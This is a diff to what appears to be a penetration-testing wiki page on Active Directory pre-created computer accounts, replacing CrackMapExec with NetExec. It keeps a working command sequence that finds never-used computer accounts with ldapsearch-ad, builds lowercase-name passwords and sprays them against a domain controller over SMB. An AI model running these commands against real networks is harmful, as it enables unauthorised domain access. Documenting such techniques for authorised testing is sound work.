@@ -15,7 +15,7 @@ Finding computer accounts that have been "pre-created" (i.e. manually created in
 
 The `logonCount` attribute can be filtered as well.
 
-The [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) tool can be used to find such accounts. Once "pre-created" computer accounts that have not authenticated are found, they should be usable with their lowercase name set as their password. This can be tested with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python) for instance.
+The [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) tool can be used to find such accounts. Once "pre-created" computer accounts that have not authenticated are found, they should be usable with their lowercase name set as their password. This can be tested with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) for instance.
 
 <pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># 1. find pre-created accounts that never logged on
 </strong><strong>ldapsearch-ad -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&#x26;(userAccountControl=4128)(logonCount=0))' | tee results.txt
@@ -27,7 +27,7 @@ cat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt
 cat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt
 
 # 4. bruteforce, line per line (user1:password1, user2:password2, ...)
-cme smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce</code></pre>
+nxc smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce</code></pre>
 
 > You will see the error message **STATUS\_NOLOGON\_WORKSTATION\_TRUST\_ACCOUNT** when you have guessed the correct password for a computer account that has not been used yet. ([trustedsec.com](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/))
 
